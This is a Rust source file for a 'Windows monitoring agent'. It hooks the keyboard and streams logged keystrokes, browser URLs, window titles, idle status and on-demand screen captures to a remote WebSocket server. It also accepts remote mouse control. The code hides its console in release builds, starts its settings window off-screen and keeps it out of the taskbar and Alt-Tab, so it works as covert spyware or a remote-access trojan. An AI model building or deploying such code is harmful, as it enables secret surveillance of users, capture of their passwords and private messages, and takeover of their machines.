//! # Windows Monitoring Agent
//!
//! Connects to a remote WebSocket server and streams real-time telemetry.
//!
//! ## Startup flow
//!
//! 1. The **main thread** loads the saved configuration, spawns a background
//!    thread that runs a Tokio runtime + the agent WebSocket loop, then calls
//!    `eframe::run_native` — this takes over the main thread for the GUI/tray.
//!
//! 2. The **background thread** installs the keyboard hook, then runs the
//!    reconnect loop.  Any time the user changes the server URL or agent name
//!    through the settings window, the new `Config` is sent over a
//!    `tokio::sync::watch` channel and the loop reconnects immediately.
//!
//! ## Tray icon
//!
//! A system-tray icon is shown in the Windows notification area.
//! - Left-click or "Settings" from the right-click menu → password prompt
//!   → settings window.
//! - Icon colour reflects connection status (green / yellow / red).
//! - The ✕ button hides the window instead of closing the process.
//! - "Exit" in the tray menu cleanly terminates the process.
//!
//! ## Outbound frames (agent → server)
//!
//! | Event                        | WS frame type  | JSON `"type"` field |
//! |------------------------------|----------------|---------------------|
//! | Screen frame (on-demand)     | `Binary`       | —                   |
//! | Buffered keystrokes          | `Text` (JSON)  | `"keys"`            |
//! | AFK transition               | `Text` (JSON)  | `"afk"`             |
//! | Return from AFK              | `Text` (JSON)  | `"active"`          |
//! | Foreground window changed    | `Text` (JSON)  | `"window_focus"`    |
//! | Active browser URL changed   | `Text` (JSON)  | `"url"`             |
//!
//! ## Inbound frames (server → agent)
//!
//! | Command          | WS frame type | JSON `"type"` field   |
//! |------------------|---------------|-----------------------|
//! | Start streaming  | `Text` (JSON) | `"start_capture"`     |
//! | Stop streaming   | `Text` (JSON) | `"stop_capture"`      |
//! | Mouse move       | `Text` (JSON) | `"MouseMove"`         |
//! | Mouse click      | `Text` (JSON) | `"MouseClick"`        |

// In release builds: suppress the console window so the agent runs silently.
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod capture;
mod config;
mod input;
mod keylogger;
mod ui;
mod url_scraper;
mod window_tracker;

use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc, Mutex,
};
use std::time::Duration;

use anyhow::{Context, Result};
use eframe::egui;
use futures_util::{SinkExt, StreamExt};
use input::InputController;
use keylogger::InputEvent;
use tokio::sync::mpsc;
use tokio::time::{interval, MissedTickBehavior};
use tokio_tungstenite::{
    connect_async,
    tungstenite::{protocol::frame::coding::CloseCode, protocol::CloseFrame, Message},
    MaybeTlsStream, WebSocketStream,
};
use tracing::{error, info, warn};
use tracing_subscriber::{fmt, EnvFilter};
use window_tracker::WindowTracker;

use config::{AgentStatus, Config};

// ─────────────────────────────────────────────────────────────────────────────
// Tunables
// ─────────────────────────────────────────────────────────────────────────────

/// Maximum frames to deliver per second.
const TARGET_FPS: u64 = 15;
const FRAME_INTERVAL_MS: u64 = 1_000 / TARGET_FPS;

/// How long to wait before attempting a reconnect after a failed session.
const RECONNECT_DELAY_SECS: u64 = 5;

/// Bounded capacity for the JPEG frame channel.
const FRAME_CHANNEL_CAP: usize = 4;

/// Bounded capacity for the outbound WebSocket message channel.
const OUTBOUND_CHANNEL_CAP: usize = 16;

/// How often to poll the foreground window for title/app changes.
const WINDOW_POLL_INTERVAL_MS: u64 = 200;

// ─────────────────────────────────────────────────────────────────────────────
// Entry point  (synchronous — eframe owns the main thread)
// ─────────────────────────────────────────────────────────────────────────────

fn main() {
    // ── Logging ───────────────────────────────────────────────────────────
    fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
        )
        .with_target(false)
        .with_thread_ids(false)
        .compact()
        .init();

    info!("Windows monitoring agent v{}", env!("CARGO_PKG_VERSION"));

    // ── Load persisted configuration ──────────────────────────────────────
    let initial_config = config::load_config();
    info!("Config loaded from {:?}", config::config_path());

    // ── Shared agent status (agent thread writes, GUI thread reads) ───────
    let agent_status: Arc<Mutex<AgentStatus>> = Arc::new(Mutex::new(AgentStatus::Disconnected));

    // ── Config watch channel (GUI thread writes, agent thread reads) ──────
    let initial_watch = if initial_config.server_url.is_empty() {
        None
    } else {
        Some(initial_config.clone())
    };
    let (config_tx, config_rx) = tokio::sync::watch::channel(initial_watch);

    // ── Synchronisation: wait for the keylogger hook to be installed ──────
    let (ready_tx, ready_rx) = std::sync::mpsc::channel::<anyhow::Result<()>>();

    // ── Background thread: Tokio runtime + agent WebSocket loop ──────────
    let status_bg = agent_status.clone();
    std::thread::Builder::new()
        .name("agent-runtime".into())
        .spawn(move || {
            let rt = tokio::runtime::Builder::new_multi_thread()
                .enable_all()
                .build()
                .expect("Failed to build Tokio runtime");

            rt.block_on(async move {
                // Keylogger channels must be created inside the async context
                // because keylogger::start() spawns a tokio task internally.
                let (key_tx, key_rx) = mpsc::unbounded_channel::<InputEvent>();
                match keylogger::start(key_tx) {
                    Ok(()) => {
                        info!("Keyboard hook installed.");
                        let _ = ready_tx.send(Ok(()));
                    }
                    Err(e) => {
                        let _ = ready_tx.send(Err(anyhow::anyhow!("{e:#}")));
                        return; // Cannot continue without keylogger
                    }
                }

                let (frame_tx, frame_rx) = mpsc::channel::<Vec<u8>>(FRAME_CHANNEL_CAP);
                run_agent_loop(config_rx, frame_tx, frame_rx, key_rx, status_bg).await;
            });
        })
        .expect("Failed to spawn agent thread");

    // Block until the keylogger hook is ready (or failed)
    match ready_rx.recv() {
        Ok(Ok(())) => {}
        Ok(Err(e)) => warn!("Keylogger failed to start: {e:#}"),
        Err(_)     => warn!("Agent thread exited before keylogger was ready"),
    }

    // ── eframe window (main thread — required by winit / Win32) ──────────
    //
    // We start the window far off-screen so it is invisible before the first
    // update() call.  We do NOT use with_visible(false) because that causes
    // eframe to suspend the render loop, which means tray events can never be
    // processed.  WS_EX_TOOLWINDOW (applied inside AgentApp::new via the raw
    // window handle) prevents the window from appearing in the taskbar or
    // Alt-Tab switcher.
    let native_options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_title("Agent Settings")
            .with_inner_size([520.0, 430.0])
            .with_position(egui::pos2(-32000.0, -32000.0)) // off-screen until first show
            .with_taskbar(false)   // hide from taskbar & Alt-Tab
            .with_resizable(false)
            .with_maximize_button(false)
            .with_minimize_button(false),
        ..Default::default()
    };

    let _ = eframe::run_native(
        "Agent Settings",
        native_options,
        Box::new(move |cc| {
            Ok(Box::new(ui::AgentApp::new(cc, initial_config, config_tx, agent_status)))
        }),
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// Agent loop with hot-reload of config
// ─────────────────────────────────────────────────────────────────────────────

async fn run_agent_loop(
    mut config_rx: tokio::sync::watch::Receiver<Option<Config>>,
    frame_tx:      mpsc::Sender<Vec<u8>>,
    mut frame_rx:  mpsc::Receiver<Vec<u8>>,
    mut key_rx:    mpsc::UnboundedReceiver<InputEvent>,
    status:        Arc<Mutex<AgentStatus>>,
) {
    // The capture stop-flag survives reconnects.
    let mut capture_stop: Option<Arc<AtomicBool>> = None;

    loop {
        // Snapshot current config (clears the "changed" flag too)
        let cfg_opt = config_rx.borrow_and_update().clone();

        match cfg_opt {
            None => {
                set_status(&status, AgentStatus::Disconnected);
                info!("No server URL configured – waiting for settings…");
                if config_rx.changed().await.is_err() {
                    return; // watch sender dropped = app exiting
                }
                continue;
            }
            Some(ref cfg) if cfg.server_url.is_empty() => {
                set_status(&status, AgentStatus::Disconnected);
                info!("Server URL is empty – waiting for settings…");
                if config_rx.changed().await.is_err() {
                    return;
                }
                continue;
            }
            Some(cfg) => {
                let ws_url = build_ws_url(&cfg);
                set_status(&status, AgentStatus::Connecting);
                info!("Connecting to {ws_url} …");
                info!("Target FPS (streaming): {TARGET_FPS}");

                match connect_async(&ws_url).await {
                    Ok((ws_stream, response)) => {
                        set_status(&status, AgentStatus::Connected);
                        info!(
                            "WebSocket connected (HTTP {}).",
                            response.status().as_u16()
                        );
                        match run_session(
                            ws_stream,
                            &frame_tx,
                            &mut frame_rx,
                            &mut key_rx,
                            &mut capture_stop,
                        )
                        .await
                        {
                            Ok(())  => info!("Session closed gracefully."),
                            Err(e)  => error!("Session error: {e:#}"),
                        }
                        set_status(&status, AgentStatus::Disconnected);
                    }
                    Err(e) => {
                        set_status(&status, AgentStatus::Error(e.to_string()));
                        error!("Connection failed: {e}");
                    }
                }

                // Wait before reconnect; wake early if the user updates config
                info!("Reconnecting in {RECONNECT_DELAY_SECS}s …");
                tokio::select! {
                    _ = tokio::time::sleep(Duration::from_secs(RECONNECT_DELAY_SECS)) => {}
                    _ = config_rx.changed() => {
                        info!("Config changed – applying new settings immediately.");
                    }
                }
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Session driver  (unchanged from original)
// ─────────────────────────────────────────────────────────────────────────────

async fn run_session(
    ws_stream:    WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
    frame_tx:     &mpsc::Sender<Vec<u8>>,
    frame_rx:     &mut mpsc::Receiver<Vec<u8>>,
    key_rx:       &mut mpsc::UnboundedReceiver<InputEvent>,
    capture_stop: &mut Option<Arc<AtomicBool>>,
) -> Result<()> {
    let (mut ws_tx, mut ws_rx) = ws_stream.split();

    // ── Outbound message bus ──────────────────────────────────────────────
    let (out_tx, mut out_rx) = mpsc::channel::<Message>(OUTBOUND_CHANNEL_CAP);

    let writer_handle = tokio::spawn(async move {
        while let Some(msg) = out_rx.recv().await {
            if let Err(e) = ws_tx.send(msg).await {
                warn!("WS write error (writer exiting): {e}");
                break;
            }
        }
        let _ = ws_tx
            .send(Message::Close(Some(CloseFrame {
                code:   CloseCode::Normal,
                reason: "agent shutting down".into(),
            })))
            .await;
        let _ = ws_tx.close().await;
    });

    // ── Input controller ──────────────────────────────────────────────────
    let mut controller =
        InputController::new().context("Failed to create input controller")?;

    // ── Window focus tracker ──────────────────────────────────────────────
    let mut win_tracker = WindowTracker::new();

    // ── Timers ────────────────────────────────────────────────────────────
    let mut frame_ticker  = interval(Duration::from_millis(FRAME_INTERVAL_MS));
    let mut url_ticker    = interval(Duration::from_secs(2));
    let mut window_ticker = interval(Duration::from_millis(WINDOW_POLL_INTERVAL_MS));

    frame_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
    url_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
    window_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);

    // ── Event loop ────────────────────────────────────────────────────────
    let result: Result<()> = loop {
        tokio::select! {
            biased;

            // ── Branch 1: inbound server commands ────────────────────────
            msg = ws_rx.next() => {
                match msg {
                    Some(Ok(Message::Text(text))) => {
                        handle_server_command(
                            &text,
                            frame_tx,
                            capture_stop,
                            &mut controller,
                        );
                    }
                    Some(Ok(Message::Close(frame))) => {
                        let reason = frame.as_ref()
                            .map(|f| f.reason.as_ref())
                            .unwrap_or("no reason");
                        info!("Server sent Close frame: {reason}");
                        break Ok(());
                    }
                    Some(Ok(Message::Ping(_))) | Some(Ok(Message::Pong(_))) => {}
                    Some(Ok(_)) => {}
                    Some(Err(e)) => break Err(anyhow::anyhow!("WS receive error: {e}")),
                    None => {
                        info!("WebSocket stream ended.");
                        break Ok(());
                    }
                }
            }

            // ── Branch 2: screen frame delivery ──────────────────────────
            _ = frame_ticker.tick() => {
                let mut latest: Option<Vec<u8>> = None;
                while let Ok(jpeg) = frame_rx.try_recv() {
                    latest = Some(jpeg);
                }
                if let Some(jpeg) = latest {
                    if out_tx.send(Message::Binary(jpeg)).await.is_err() {
                        break Err(anyhow::anyhow!(
                            "Outbound channel closed; writer task exited unexpectedly."
                        ));
                    }
                }
            }

            // ── Branch 3: active browser URL ─────────────────────────────
            _ = url_ticker.tick() => {
                if let Some(info) = url_scraper::get_active_url() {
                    let payload = serde_json::json!({
                        "type"    : "url",
                        "url"     : info.url,
                        "title"   : info.title,
                        "browser" : info.browser_name,
                        "ts"      : unix_timestamp_secs(),
                    })
                    .to_string();
                    if out_tx.send(Message::Text(payload)).await.is_err() {
                        break Err(anyhow::anyhow!(
                            "Outbound channel closed; writer task exited unexpectedly."
                        ));
                    }
                }
            }

            // ── Branch 4: keystrokes / AFK ───────────────────────────────
            event = key_rx.recv() => {
                let payload = match event {
                    Some(InputEvent::Keys { text, app, window, ts }) => {
                        serde_json::json!({
                            "type"   : "keys",
                            "text"   : text,
                            "app"    : app,
                            "window" : window,
                            "ts"     : ts,
                        })
                        .to_string()
                    }
                    Some(InputEvent::Afk { idle_secs }) => {
                        serde_json::json!({
                            "type"     : "afk",
                            "idle_secs": idle_secs,
                            "ts"       : unix_timestamp_secs(),
                        })
                        .to_string()
                    }
                    Some(InputEvent::Active) => {
                        serde_json::json!({
                            "type": "active",
                            "ts"  : unix_timestamp_secs(),
                        })
                        .to_string()
                    }
                    None => break Ok(()),
                };
                if out_tx.send(Message::Text(payload)).await.is_err() {
                    break Err(anyhow::anyhow!(
                        "Outbound channel closed; writer task exited unexpectedly."
                    ));
                }
            }

            // ── Branch 5: foreground window changes ───────────────────────
            _ = window_ticker.tick() => {
                if let Some(event) = win_tracker.poll() {
                    let payload = serde_json::json!({
                        "type"  : "window_focus",
                        "title" : event.title,
                        "app"   : event.app,
                        "hwnd"  : event.hwnd,
                        "ts"    : unix_timestamp_secs(),
                    })
                    .to_string();
                    if out_tx.send(Message::Text(payload)).await.is_err() {
                        break Err(anyhow::anyhow!(
                            "Outbound channel closed; writer task exited unexpectedly."
                        ));
                    }
                }
            }
        }
    };

    // ── Shutdown ──────────────────────────────────────────────────────────
    drop(out_tx);
    if let Err(e) = writer_handle.await {
        warn!("Writer task panicked: {e}");
    }

    result
}

// ─────────────────────────────────────────────────────────────────────────────
// Server command handler
// ─────────────────────────────────────────────────────────────────────────────

fn handle_server_command(
    text:         &str,
    frame_tx:     &mpsc::Sender<Vec<u8>>,
    capture_stop: &mut Option<Arc<AtomicBool>>,
    controller:   &mut InputController,
) {
    let val: serde_json::Value = match serde_json::from_str(text) {
        Ok(v)  => v,
        Err(_) => return,
    };

    match val["type"].as_str().unwrap_or("") {
        "start_capture" => {
            if capture_stop.is_none() {
                let stop = Arc::new(AtomicBool::new(false));
                match capture::start_capture(frame_tx.clone(), stop.clone()) {
                    Ok(()) => {
                        *capture_stop = Some(stop);
                        info!("Screen capture started (viewer connected).");
                    }
                    Err(e) => warn!("Failed to start capture: {e}"),
                }
            }
        }
        "stop_capture" => {
            if let Some(stop) = capture_stop.take() {
                stop.store(true, Ordering::Relaxed);
                info!("Screen capture stopped (no viewers remaining).");
            }
        }
        _ => {
            if let Err(e) = controller.handle_command(text) {
                warn!("Control command error: {e:#}");
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

/// Build the full WebSocket URL, appending `?name=<agent_name>`.
fn build_ws_url(cfg: &Config) -> String {
    let base = cfg.server_url.trim_end_matches('/');
    if cfg.agent_name.is_empty() {
        base.to_string()
    } else if base.contains('?') {
        format!("{}&name={}", base, cfg.agent_name)
    } else {
        format!("{}?name={}", base, cfg.agent_name)
    }
}

/// Write to the shared status mutex, ignoring lock-poison errors.
fn set_status(status: &Mutex<AgentStatus>, s: AgentStatus) {
    if let Ok(mut guard) = status.lock() {
        *guard = s;
    }
}

#[inline]
fn unix_timestamp_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}
